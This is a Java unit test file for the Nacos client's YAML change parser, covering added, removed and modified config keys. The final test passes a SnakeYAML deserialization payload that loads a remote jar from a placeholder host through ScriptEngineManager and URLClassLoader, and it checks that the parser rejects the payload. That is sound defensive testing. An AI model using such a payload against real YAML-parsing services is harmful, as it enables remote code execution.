/*
 * Copyright 1999-2018 Alibaba Group Holding Ltd.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.alibaba.nacos.client.config.impl;

import com.alibaba.nacos.api.config.ConfigChangeItem;
import com.alibaba.nacos.api.exception.runtime.NacosRuntimeException;
import org.junit.Assert;
import org.junit.Test;

import java.io.IOException;
import java.util.Map;

public class YmlChangeParserTest {
    
    private final YmlChangeParser parser = new YmlChangeParser();
    
    private final String type = "yaml";
    
    @Test
    public void testType() {
        Assert.assertEquals(true, parser.isResponsibleFor(type));
    }
    
    @Test
    public void testAddKey() throws IOException {
        Map<String, ConfigChangeItem> map = parser.doParse("", "app:\n  name: nacos", type);
        Assert.assertEquals(null, map.get("app.name").getOldValue());
        Assert.assertEquals("nacos", map.get("app.name").getNewValue());
    }
    
    @Test
    public void testRemoveKey() throws IOException {
        Map<String, ConfigChangeItem> map = parser.doParse("app:\n  name: nacos", "", type);
        Assert.assertEquals("nacos", map.get("app.name").getOldValue());
        Assert.assertEquals(null, map.get("app.name").getNewValue());
    }
    
    @Test
    public void testModifyKey() throws IOException {
        Map<String, ConfigChangeItem> map = parser.doParse("app:\n  name: rocketMQ", "app:\n  name: nacos", type);
        Assert.assertEquals("rocketMQ", map.get("app.name").getOldValue());
        Assert.assertEquals("nacos", map.get("app.name").getNewValue());
    }
    
    @Test
    public void testComplexYaml() throws IOException {
        /*
         * map:
         *   key1: "string"
         *   key2:
         *     - item1
         *     - item2
         *     - item3
         *   key3: 123
         */
        String s = "map:\n" + "  key1: \"string\"\n" + "  key2:\n" + "    - item1\n" + "    - item2\n" + "    - item3\n"
                + "  key3: 123    \n";
        Map<String, ConfigChangeItem> map = parser.doParse(s, s, type);
        Assert.assertEquals(0, map.size());
    }
    
    @Test(expected = NacosRuntimeException.class)
    public void testChangeInvalidKey() {
        parser.doParse("anykey:\n  a",
                "anykey: !!javax.script.ScriptEngineManager [\n" + "  !!java.net.URLClassLoader [[\n"
                        + "    !!java.net.URL [\"http://[yourhost]:[port]/yaml-payload.jar\"]\n" + "  ]]\n" + "]",
                type);
    }
}

